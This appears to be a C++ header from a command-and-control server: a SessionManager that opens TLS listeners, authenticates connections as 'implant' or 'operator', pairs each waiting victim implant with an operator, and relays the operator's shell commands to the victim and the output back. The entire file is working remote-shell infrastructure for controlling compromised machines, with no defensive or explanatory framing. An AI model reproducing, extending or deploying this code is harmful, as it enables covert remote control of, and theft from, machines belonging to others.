#pragma once

#include "Util/SafeLogger.hpp"
#include "Config.hpp"
#include "SessionConnectionAuthenticator.hpp"
#include <SessionHandshake.hpp>

#include <Remote.hpp>
#include <Server.hpp>
#include <atomic>
#include <chrono>
#include <cstdint>
#include <map>
#include <memory>
#include <optional>
#include <string>
#include <thread>
#include <mutex>
#include <vector>

inline constexpr std::size_t kMaxBridgeOutputBytes = 16 * 1024 * 1024;

class SessionManager {
private:
    SessionManager() = default;
    ~SessionManager() {
        stop_all();
    }
    SessionManager(const SessionManager&) = delete;
    SessionManager& operator=(const SessionManager&) = delete;

    struct ListenerState {
        std::shared_ptr<cpppwn::Server> server;
        std::jthread worker;
    };

    std::map<uint16_t, ListenerState> listeners;
    std::mutex mtx;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_operators;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_victims;
    std::vector<std::jthread> connection_workers;
    std::vector<std::jthread> bridge_workers;
    SessionConnectionAuthenticator* session_auth_ = nullptr;
    std::atomic<bool> shutting_down_{false};

    static void close_remote_map(std::map<int64_t, std::unique_ptr<cpppwn::Remote>>& remotes) {
        for (auto& [port, remote] : remotes) {
            (void)port;
            if (remote && remote->is_alive()) {
                remote->close();
            }
        }
        remotes.clear();
    }

    [[nodiscard]] bool authenticate_connection(cpppwn::Remote& conn, std::string& role_out) {
        if (session_auth_ == nullptr) {
            logger::error("Session authenticator is not configured");
            return false;
        }

        const auto credentials = session_handshake::receive(conn);
        if (!credentials.has_value()) {
            logger::warn("Session handshake incomplete");
            return false;
        }

        role_out = credentials->role;
        if (!session_auth_->authenticate(credentials->role, credentials->username, credentials->password)) {
            logger::warn("Session authentication failed for role [{}] user [{}]", credentials->role, credentials->username);
            return false;
        }

        logger::info("Session authenticated for role [{}] user [{}]", credentials->role, credentials->username);
        return true;
    }

    struct BridgePair {
        std::unique_ptr<cpppwn::Remote> victim;
        std::unique_ptr<cpppwn::Remote> operator_conn;
    };

    [[nodiscard]] std::optional<BridgePair> queue_authenticated_connection(
        std::unique_ptr<cpppwn::Remote>&& conn,
        int64_t port,
        const std::string& role) {
        if (role.starts_with(session_handshake::implant_role)) {
            if (waiting_operators.contains(port)) {
                BridgePair pair{
                    .victim = std::move(conn),
                    .operator_conn = std::move(waiting_operators[port]),
                };
                waiting_operators.erase(port);
                return pair;
            }

            waiting_victims[port] = std::move(conn);
            logger::info("Implant linked to Port: {}", port);
            return std::nullopt;
        }

        if (role.starts_with(session_handshake::operator_role)) {
            if (waiting_victims.contains(port)) {
                BridgePair pair{
                    .victim = std::move(waiting_victims[port]),
                    .operator_conn = std::move(conn),
                };
                waiting_victims.erase(port);
                return pair;
            }

            conn->sendline(session_handshake::bridge_waiting);
            waiting_operators[port] = std::move(conn);
            logger::info("Operator waiting for Victim on Port: {}", port);
        }

        return std::nullopt;
    }

    static void release_worker(std::jthread& worker) noexcept {
        if (worker.joinable()) {
            worker.detach();
        }
    }

public:
    static SessionManager& instance() {
        static SessionManager instance;
        return instance;
    }

    void set_session_authenticator(SessionConnectionAuthenticator* authenticator) {
        session_auth_ = authenticator;
    }

    bool start_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        if (listeners.contains(port)) {
            return false;
        }
        auto& config = Config::instance("server.db");

        auto server = std::make_shared<cpppwn::Server>(
            port,
            cpppwn::TlsConfig{
                config.get<std::string>("victim_cert"),
                config.get<std::string>("victim_key"),
            });

        ListenerState state;
        state.server = server;
        state.worker = std::jthread([this, server, port](std::stop_token stoken) {
            while (not stoken.stop_requested()) {
                try {
                    auto conn = server->accept();
                    this->handle_new_connection(std::move(conn), port);
                } catch (const std::exception&) {
                    if (stoken.stop_requested() || !server->is_open()) {
                        break;
                    }
                }
            }
        });
        listeners.emplace(port, std::move(state));
        return true;
    }

    void handle_new_connection(std::unique_ptr<cpppwn::Remote>&& conn, int64_t port) {
        if (shutting_down_.load(std::memory_order_acquire)) {
            if (conn && conn->is_alive()) {
                conn->close();
            }
            return;
        }

        auto worker = std::jthread([this, conn_ptr = std::move(conn), port]() mutable -> void {
            try {
                std::string role;
                if (!authenticate_connection(*conn_ptr, role)) {
                    return;
                }

                std::optional<BridgePair> bridge;
                {
                    std::lock_guard inner_lock(mtx);
                    bridge = queue_authenticated_connection(std::move(conn_ptr), port, role);
                }

                if (bridge.has_value()) {
                    bridge_sockets(std::move(bridge->victim), std::move(bridge->operator_conn));
                }
            } catch (const std::exception& e) {
                logger::warn("Connection handler failed: {}", e.what());
            }
        });

        std::lock_guard lock(mtx);
        connection_workers.push_back(std::move(worker));
    }

    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& victim, std::unique_ptr<cpppwn::Remote>&& operator_conn) {
        if (shutting_down_.load(std::memory_order_acquire)) {
            if (victim && victim->is_alive()) {
                victim->close();
            }
            if (operator_conn && operator_conn->is_alive()) {
                operator_conn->close();
            }
            return;
        }

        operator_conn->sendline(session_handshake::bridge_ready);

        auto bridge_worker = std::jthread([vic = std::move(victim), op = std::move(operator_conn)]() -> void {
            logger::success("Bridging established between Implant and Operator.");

            while (vic->is_alive() && op->is_alive()) {
                session_handshake::clear_recv_buffer(*op);
                const auto cmd = trim_string(op->recvline());
                logger::debug("Shell Command From Operator: [{}]", cmd);
                vic->sendline(cmd);

                session_handshake::clear_recv_buffer(*vic);
                const auto output_size = trim_string(vic->recvline());
                logger::debug("Output Size: [{}]", output_size);
                op->sendline(output_size);

                const auto out_size = std::atol(output_size.c_str());
                if (out_size > 0) {
                    if (static_cast<std::size_t>(out_size) > kMaxBridgeOutputBytes) {
                        logger::warn("Bridge output size {} exceeds cap", out_size);
                        break;
                    }
                    const auto output = trim_string(vic->recv(static_cast<std::size_t>(out_size)));
                    logger::debug("Output from Victim: [{}]", output);
                    op->send(output);
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(5));
            }
            logger::warn("Bridge closed: One or both parties disconnected.");
        });

        std::lock_guard lock(mtx);
        if (shutting_down_.load(std::memory_order_acquire)) {
            release_worker(bridge_worker);
            return;
        }
        bridge_workers.push_back(std::move(bridge_worker));
    }

    void stop_listener(uint16_t port) {
        std::optional<ListenerState> listener;
        {
            std::lock_guard lock(mtx);
            const auto it = listeners.find(port);
            if (it != listeners.end()) {
                listener = std::move(it->second);
                listeners.erase(it);
            }
            if (auto operator_it = waiting_operators.find(port); operator_it != waiting_operators.end()) {
                if (operator_it->second && operator_it->second->is_alive()) {
                    operator_it->second->close();
                }
                waiting_operators.erase(operator_it);
            }
            if (auto victim_it = waiting_victims.find(port); victim_it != waiting_victims.end()) {
                if (victim_it->second && victim_it->second->is_alive()) {
                    victim_it->second->close();
                }
                waiting_victims.erase(victim_it);
            }
        }

        if (listener.has_value()) {
            if (listener->server && listener->server->is_open()) {
                listener->server->close();
            }
            release_worker(listener->worker);
        }
    }

    void stop_all() {
        shutting_down_.store(true, std::memory_order_release);

        std::vector<ListenerState> listener_states;
        std::vector<std::jthread> connection_workers_local;
        std::vector<std::jthread> bridge_workers_local;

        {
            std::lock_guard lock(mtx);
            listener_states.reserve(listeners.size());
            for (auto& [port, state] : listeners) {
                (void)port;
                listener_states.push_back(std::move(state));
            }
            listeners.clear();

            connection_workers_local = std::move(connection_workers);
            connection_workers.clear();
            bridge_workers_local = std::move(bridge_workers);
            bridge_workers.clear();

            close_remote_map(waiting_operators);
            close_remote_map(waiting_victims);
        }

        for (auto& state : listener_states) {
            if (state.server && state.server->is_open()) {
                state.server->close();
            }
            release_worker(state.worker);
        }

        for (auto& worker : connection_workers_local) {
            release_worker(worker);
        }

        for (auto& worker : bridge_workers_local) {
            release_worker(worker);
        }

        {
            std::lock_guard lock(mtx);
            for (auto& worker : connection_workers) {
                release_worker(worker);
            }
            connection_workers.clear();
            for (auto& worker : bridge_workers) {
                release_worker(worker);
            }
            bridge_workers.clear();
            close_remote_map(waiting_operators);
            close_remote_map(waiting_victims);
        }
    }
};
